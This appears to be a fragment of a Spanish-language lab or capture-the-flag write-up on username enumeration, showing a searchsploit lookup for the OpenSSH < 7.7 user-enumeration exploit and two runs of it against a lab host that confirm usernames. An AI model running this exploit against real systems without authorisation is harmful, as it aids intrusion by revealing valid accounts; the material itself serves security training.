
---
**ENUMERACIÓN DE USUARIOS**

---
**EXPLOIT**
```ruby
❯ searchsploit ssh user enumeration
OpenSSH < 7.7 - User Enumeration (2)     |linux/remote/45939.py
```

**EJECUCIÓN**
```python
❯ python2 45939.py 10.10.10.46 root 2>/dev/null
[+] root is a valid username

❯ python2 45939.py 10.10.10.46 falaraki 2>/dev/null
[+] falaraki is a valid username
```